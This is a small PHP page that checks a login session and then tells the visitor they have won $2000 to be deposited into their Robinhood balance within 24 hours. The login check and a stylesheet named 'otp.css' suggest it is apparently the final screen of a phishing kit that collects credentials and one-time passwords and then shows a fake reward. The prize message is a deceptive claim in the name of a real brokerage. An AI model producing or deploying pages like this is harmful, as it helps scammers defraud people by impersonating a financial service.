<?php
session_start();
if (!isset($_SESSION['email'])) {
    // User is not logged in, redirect to login
    header("Location: login.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations</title>
    <link rel="stylesheet" href="otp.css">
</head>
<body>
    <div class="container">
        <h2>Congratulations</h2>
        <p>You've won $2000!! The funds will be deposited into your Robinhood balance within 24 hours.</p>
    </div>
</body>
</html>
